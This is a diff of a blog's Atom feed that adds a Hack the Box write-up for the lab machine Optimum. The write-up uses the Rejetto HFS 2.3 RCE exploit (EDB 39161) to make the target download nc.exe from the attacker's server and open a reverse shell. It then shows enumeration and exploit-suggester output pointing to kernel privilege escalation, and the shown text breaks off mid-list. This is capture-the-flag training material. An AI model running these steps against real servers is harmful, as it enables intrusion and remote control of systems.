@@ -1,5 +1,331 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-04-26T00:00:00-07:00</updated><entry><title>Beep - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-beep.html" rel="alternate"></link><published>2020-04-26T00:00:00-07:00</published><updated>2020-04-26T00:00:00-07:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-beep.html,2020-04-26:</id><summary type="html">&lt;p&gt;Guide to Beep from Hack the Box&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-05-03T00:00:00-07:00</updated><entry><title>Optimum - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-optimum.html" rel="alternate"></link><published>2020-05-03T00:00:00-07:00</published><updated>2020-05-03T00:00:00-07:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-optimum.html,2020-05-03:</id><summary type="html">&lt;p&gt;Guide to Optimum on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+&lt;p&gt;Optimum is a Windows 2012 R2 server with only an HTTP server available on it. After exploiting the web server, we move on to identifying a compatible kernel exploit to get to system.&lt;/p&gt;
+&lt;h2&gt;Reconnaissance&lt;/h2&gt;
+&lt;p&gt;Optimum is hosted on IP 10.10.10.8.&lt;/p&gt;
+&lt;h4&gt;Nmap&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nmap -sV -sC -oA nmap/optimum &lt;span class="m"&gt;10&lt;/span&gt;.10.10.8                                                                           
+Starting Nmap &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2020&lt;/span&gt;-05-03 &lt;span class="m"&gt;12&lt;/span&gt;:18 PDT     
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.8   
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12s latency&lt;span class="o"&gt;)&lt;/span&gt;.                                     
+Not shown: &lt;span class="m"&gt;999&lt;/span&gt; filtered ports                                                                                                                                
+PORT   STATE SERVICE VERSION                                                                                                                                 
+&lt;span class="m"&gt;80&lt;/span&gt;/tcp open  http    HttpFileServer httpd &lt;span class="m"&gt;2&lt;/span&gt;.3                                                                                                                
+&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: HFS &lt;span class="m"&gt;2&lt;/span&gt;.3      
+&lt;span class="p"&gt;|&lt;/span&gt;_http-title: HFS /   
+Service Info: OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The HTTP server hosts a Rejetto HttpFileServer v2.3.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="eea2296636a6b8d964096ab92419281b.png" src="images/ctf/htb/optimum/8b7396f97c9b48be9f0b2e77091f92b1.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Anonymous -&amp;gt; User&lt;/h2&gt;
+&lt;p&gt;This version has a known RCE exploit (&lt;a href="https://www.exploit-db.com/exploits/39161"&gt;EDB 39161&lt;/a&gt;. To set up the exploit, we need to: 1) host a Windows &lt;code&gt;nc.exe&lt;/code&gt; binary on a web server that will be downloaded to our target; 2) configure the exloit file to connect back to a listener on our own box; 3) run the exploit, possibly multiple times. In order to set this up, I had to use 3 terminal windows; &lt;code&gt;tmux&lt;/code&gt; makes this an easy task, and I highly suggest picking it up.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;# Terminal 1 / http server:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;In this terminal, we locate the &lt;code&gt;nc.exe&lt;/code&gt; file in Kali, create a soft link in our local directory, then start a simple HTTP server using Python.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# locate nc.exe&lt;/span&gt;
+/usr/share/windows-resources/binaries/nc.exe
+&lt;span class="c1"&gt;# link -s /usr/share/windows-resources/binaries/nc.exe ./nc.exe&lt;/span&gt;
+&lt;span class="c1"&gt;# python3 -m http.server 80&lt;/span&gt;
+Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class="o"&gt;)&lt;/span&gt; ...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;# Terminal 2 / ncat:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;We need to configure the file to send back to our own address and stand up a listener for the server to connect back to. To configure the file, replace the IP and port on lines 35 &amp;amp; 36 respectively. For the latter task I use &lt;code&gt;ncat&lt;/code&gt;, listening on port &lt;code&gt;8080&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ncat -nvl 8080&lt;/span&gt;
+Ncat: Version &lt;span class="m"&gt;7&lt;/span&gt;.80 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class="o"&gt;)&lt;/span&gt;
+Ncat: Listening on :::8080
+Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Exploiting the HFS:&lt;/h3&gt;
+&lt;p&gt;Now we just need to run the exploit. I had to run this 2 times: the first time made a connection back to download &lt;code&gt;nc.exe&lt;/code&gt; from the web server but did not spawn a shell; the second time did spawn a shell.  This is in-line with a note in the exploit file.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;# Terminal 3 / exploit:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# python2 ./39161.py 10.10.10.8 80&lt;/span&gt;
+&lt;span class="c1"&gt;# python2 ./39161.py 10.10.10.8 80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;# Terminal 1 / http server, exec 1:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Serving HTTP on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 port &lt;span class="m"&gt;80&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class="o"&gt;)&lt;/span&gt; ...
+&lt;span class="m"&gt;10&lt;/span&gt;.10.10.8 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;03&lt;/span&gt;/May/2020 &lt;span class="m"&gt;12&lt;/span&gt;:40:02&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /nc.exe HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; -
+&lt;span class="m"&gt;10&lt;/span&gt;.10.10.8 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;03&lt;/span&gt;/May/2020 &lt;span class="m"&gt;12&lt;/span&gt;:40:02&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /nc.exe HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; -
+&lt;span class="m"&gt;10&lt;/span&gt;.10.10.8 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;03&lt;/span&gt;/May/2020 &lt;span class="m"&gt;12&lt;/span&gt;:40:02&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /nc.exe HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; -
+&lt;span class="m"&gt;10&lt;/span&gt;.10.10.8 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;03&lt;/span&gt;/May/2020 &lt;span class="m"&gt;12&lt;/span&gt;:40:02&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /nc.exe HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; -
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;strong&gt;# Terminal 2 / ncat, exec 2:&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ncat: Listening on &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
+Ncat: Connection from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.8.
+Ncat: Connection from &lt;span class="m"&gt;10&lt;/span&gt;.10.10.8:49162.
+Microsoft Windows &lt;span class="o"&gt;[&lt;/span&gt;Version &lt;span class="m"&gt;6&lt;/span&gt;.3.9600&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2013&lt;/span&gt; Microsoft Corporation. All rights reserved.
+
+C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\k&lt;/span&gt;ostas&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;whoami &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; hostname
+whoami &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; hostname
+optimum&lt;span class="se"&gt;\k&lt;/span&gt;ostas
+optimum
+
+C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\k&lt;/span&gt;ostas&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;dir  
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\k&lt;/span&gt;ostas&lt;span class="se"&gt;\D&lt;/span&gt;esktop
+
+&lt;span class="m"&gt;10&lt;/span&gt;/05/2020  &lt;span class="m"&gt;07&lt;/span&gt;:19     &amp;lt;DIR&amp;gt;          .
+&lt;span class="m"&gt;10&lt;/span&gt;/05/2020  &lt;span class="m"&gt;07&lt;/span&gt;:19     &amp;lt;DIR&amp;gt;          ..
+&lt;span class="m"&gt;18&lt;/span&gt;/03/2017  &lt;span class="m"&gt;03&lt;/span&gt;:11            &lt;span class="m"&gt;760&lt;/span&gt;.320 hfs.exe
+&lt;span class="m"&gt;18&lt;/span&gt;/03/2017  &lt;span class="m"&gt;03&lt;/span&gt;:13                 &lt;span class="m"&gt;32&lt;/span&gt; user.txt.txt
+               &lt;span class="m"&gt;2&lt;/span&gt; File&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;        &lt;span class="m"&gt;760&lt;/span&gt;.352 bytes
+               &lt;span class="m"&gt;2&lt;/span&gt; Dir&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;  &lt;span class="m"&gt;31&lt;/span&gt;.882.088.448 bytes free
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2&gt;Server enumeration&lt;/h2&gt;
+&lt;p&gt;From this point, we can perform further enumeration on the target system. A good place to start is with OS and system information.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&amp;gt; systeminfo&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;Host Name:                 OPTIMUM            &lt;/span&gt;
+&lt;span class="err"&gt;OS Name:                   Microsoft Windows Server 2012 R2 Standard&lt;/span&gt;
+&lt;span class="err"&gt;OS Version:                6.3.9600 N/A Build 9600&lt;/span&gt;
+&lt;span class="err"&gt;OS Manufacturer:           Microsoft Corporation&lt;/span&gt;
+&lt;span class="err"&gt;OS Configuration:          Standalone Server&lt;/span&gt;
+&lt;span class="err"&gt;OS Build Type:             Multiprocessor Free&lt;/span&gt;
+&lt;span class="err"&gt;Registered Owner:          Windows User&lt;/span&gt;
+&lt;span class="err"&gt;Registered Organization:   &lt;/span&gt;
+&lt;span class="err"&gt;Product ID:                00252-70000-00000-AA535&lt;/span&gt;
+&lt;span class="err"&gt;Original Install Date:     18/3/2017, 1:51:36 &lt;/span&gt;
+&lt;span class="err"&gt;System Boot Time:          10/5/2020, 7:17:21 &lt;/span&gt;
+&lt;span class="err"&gt;System Manufacturer:       VMware, Inc.&lt;/span&gt;
+&lt;span class="err"&gt;System Model:              VMware Virtual Platform&lt;/span&gt;
+&lt;span class="err"&gt;System Type:               x64-based PC&lt;/span&gt;
+&lt;span class="err"&gt;Processor(s):              1 Processor(s) Installed.&lt;/span&gt;
+&lt;span class="err"&gt;                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz&lt;/span&gt;
+&lt;span class="err"&gt;BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018&lt;/span&gt;
+&lt;span class="err"&gt;Windows Directory:         C:\Windows&lt;/span&gt;
+&lt;span class="err"&gt;System Directory:          C:\Windows\system32&lt;/span&gt;
+&lt;span class="err"&gt;Boot Device:               \Device\HarddiskVolume1&lt;/span&gt;
+&lt;span class="err"&gt;System Locale:             el;Greek&lt;/span&gt;
+&lt;span class="err"&gt;Input Locale:              en-us;English (United States)&lt;/span&gt;
+&lt;span class="err"&gt;Time Zone:                 (UTC+02:00) Athens, Bucharest&lt;/span&gt;
+&lt;span class="err"&gt;Total Physical Memory:     4.095 MB&lt;/span&gt;
+&lt;span class="err"&gt;Available Physical Memory: 3.479 MB&lt;/span&gt;
+&lt;span class="err"&gt;Virtual Memory: Max Size:  5.503 MB&lt;/span&gt;
+&lt;span class="err"&gt;Virtual Memory: Available: 4.682 MB&lt;/span&gt;
+&lt;span class="err"&gt;Virtual Memory: In Use:    821 MB&lt;/span&gt;
+&lt;span class="err"&gt;Page File Location(s):     C:\pagefile.sys&lt;/span&gt;
+&lt;span class="c"&gt;Domain:                    HTB&lt;/span&gt;
+&lt;span class="err"&gt;Logon Server:              \\OPTIMUM&lt;/span&gt;
+&lt;span class="err"&gt;Hotfix(s):                 31 Hotfix(s) Installed.&lt;/span&gt;
+&lt;span class="err"&gt;                           [01]: KB2959936&lt;/span&gt;
+&lt;span class="err"&gt;                           [02]: KB2896496&lt;/span&gt;
+&lt;span class="err"&gt;                           [03]: KB2919355&lt;/span&gt;
+&lt;span class="err"&gt;                           [04]: KB2920189&lt;/span&gt;
+&lt;span class="err"&gt;                           [05]: KB2928120&lt;/span&gt;
+&lt;span class="err"&gt;                           [06]: KB2931358&lt;/span&gt;
+&lt;span class="err"&gt;                           [07]: KB2931366&lt;/span&gt;
+&lt;span class="err"&gt;                           [08]: KB2933826&lt;/span&gt;
+&lt;span class="err"&gt;                           [09]: KB2938772&lt;/span&gt;
+&lt;span class="err"&gt;                           [10]: KB2949621&lt;/span&gt;
+&lt;span class="err"&gt;                           [11]: KB2954879&lt;/span&gt;
+&lt;span class="err"&gt;                           [12]: KB2958262&lt;/span&gt;
+&lt;span class="err"&gt;                           [13]: KB2958263&lt;/span&gt;
+&lt;span class="err"&gt;                           [14]: KB2961072&lt;/span&gt;
+&lt;span class="err"&gt;                           [15]: KB2965500&lt;/span&gt;
+&lt;span class="err"&gt;                           [16]: KB2966407&lt;/span&gt;
+&lt;span class="err"&gt;                           [17]: KB2967917&lt;/span&gt;
+&lt;span class="err"&gt;                           [18]: KB2971203&lt;/span&gt;
+&lt;span class="err"&gt;                           [19]: KB2971850&lt;/span&gt;
+&lt;span class="err"&gt;                           [20]: KB2973351&lt;/span&gt;
+&lt;span class="err"&gt;                           [21]: KB2973448&lt;/span&gt;
+&lt;span class="err"&gt;                           [22]: KB2975061&lt;/span&gt;
+&lt;span class="err"&gt;                           [23]: KB2976627&lt;/span&gt;
+&lt;span class="err"&gt;                           [24]: KB2977629&lt;/span&gt;
+&lt;span class="err"&gt;                           [25]: KB2981580&lt;/span&gt;
+&lt;span class="err"&gt;                           [26]: KB2987107&lt;/span&gt;
+&lt;span class="err"&gt;                           [27]: KB2989647&lt;/span&gt;
+&lt;span class="err"&gt;                           [28]: KB2998527&lt;/span&gt;
+&lt;span class="err"&gt;                           [29]: KB3000850&lt;/span&gt;
+&lt;span class="err"&gt;                           [30]: KB3003057&lt;/span&gt;
+&lt;span class="err"&gt;                           [31]: KB3014442&lt;/span&gt;
+&lt;span class="err"&gt;Network Card(s):           1 NIC(s) Installed.&lt;/span&gt;
+&lt;span class="err"&gt;                           [01]: Intel(R) 82574L Gigabit Network Connection&lt;/span&gt;
+&lt;span class="err"&gt;                                 Connection Name: Ethernet0&lt;/span&gt;
+&lt;span class="err"&gt;                                 DHCP Enabled:    No&lt;/span&gt;
+&lt;span class="err"&gt;                                 IP address(es)&lt;/span&gt;
+&lt;span class="err"&gt;                                 [01]: 10.10.10.8&lt;/span&gt;
+&lt;span class="err"&gt;Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This is a Windows Server 2012 R2 box running on an old patch. A kernel exploit could work; we can investigate this using &lt;a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester"&gt;Windows Exploit Suggester&lt;/a&gt;. I would suggest the use of Watson, but as this is an old box and Watson no longer supports versions of Windows below 10 or Server 2016, it may miss integral information.&lt;/p&gt;
+&lt;p&gt;The first step in doing this was saving the above systeminfo output into a txt file.  Next, I updated Windows Exploit Suggester and ran the python script.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&amp;gt; windows-exploit-suggester&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ./windows-exploit-suggester.py -d ./2020-05-03-mssb.xls --systeminfo systeminfo.txt&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; initiating winsploit version &lt;span class="m"&gt;3&lt;/span&gt;.3...
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; database file detected as xls or xlsx based on extension
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; attempting to &lt;span class="nb"&gt;read&lt;/span&gt; from the systeminfo input file
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; systeminfo input file &lt;span class="nb"&gt;read&lt;/span&gt; successfully &lt;span class="o"&gt;(&lt;/span&gt;ascii&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; querying database file &lt;span class="k"&gt;for&lt;/span&gt; potential vulnerabilities
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; comparing the &lt;span class="m"&gt;32&lt;/span&gt; hotfix&lt;span class="o"&gt;(&lt;/span&gt;es&lt;span class="o"&gt;)&lt;/span&gt; against the &lt;span class="m"&gt;266&lt;/span&gt; potential bulletins&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt; with a database of &lt;span class="m"&gt;137&lt;/span&gt; known exploits                   
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; there are now &lt;span class="m"&gt;246&lt;/span&gt; remaining vulns
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; exploitdb PoC, &lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; Metasploit module, &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; missing bulletin
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; windows version identified as &lt;span class="s1"&gt;&amp;#39;Windows 2012 R2 64-bit&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-135: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Windows Kernel-Mode Drivers &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3199135&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service &lt;span class="o"&gt;(&lt;/span&gt;MS16-135&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &lt;span class="s1"&gt;&amp;#39;win32k.sys&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;NtSetWindowLongPtr&amp;#39;&lt;/span&gt; Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS16-135&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-098: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Windows Kernel-Mode Drivers &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3178466&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important                                              
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows &lt;span class="m"&gt;8&lt;/span&gt;.1 &lt;span class="o"&gt;(&lt;/span&gt;x64&lt;span class="o"&gt;)&lt;/span&gt; - RGNOBJ Integer Overflow &lt;span class="o"&gt;(&lt;/span&gt;MS16-098&lt;span class="o"&gt;)&lt;/span&gt;                
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS16-075: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Windows SMB Server &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3164038&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://github.com/foxglovesec/RottenPotato
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://github.com/Kevin-Robertson/Tater
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://bugs.chromium.org/p/project-zero/issues/detail?id&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;222&lt;/span&gt; -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-074: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Microsoft Graphics Component &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3164036&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important                          
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure &lt;span class="o"&gt;(&lt;/span&gt;MS16-074&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption &lt;span class="o"&gt;(&lt;/span&gt;MS16-074&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-063: Cumulative Security Update &lt;span class="k"&gt;for&lt;/span&gt; Internet Explorer &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3163649&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer &lt;span class="m"&gt;11&lt;/span&gt; - Garbage Collector Attribute Type Confusion &lt;span class="o"&gt;(&lt;/span&gt;MS16-063&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-032: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Secondary Logon to Address Elevation of Privile &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3143141&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows &lt;span class="m"&gt;8&lt;/span&gt;.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS16-032&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows &lt;span class="m"&gt;7&lt;/span&gt;-10 &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Server &lt;span class="m"&gt;2008&lt;/span&gt;-2012 &lt;span class="o"&gt;(&lt;/span&gt;x32/x64&lt;span class="o"&gt;)&lt;/span&gt; - Local Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS16-032&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;PowerShell&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows &lt;span class="m"&gt;7&lt;/span&gt;-10 &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Server &lt;span class="m"&gt;2008&lt;/span&gt;-2012 &lt;span class="o"&gt;(&lt;/span&gt;x32/x64&lt;span class="o"&gt;)&lt;/span&gt; - Local Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS16-032&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;C#&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS16-016: Security Update &lt;span class="k"&gt;for&lt;/span&gt; WebDAV to Address Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3136041&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
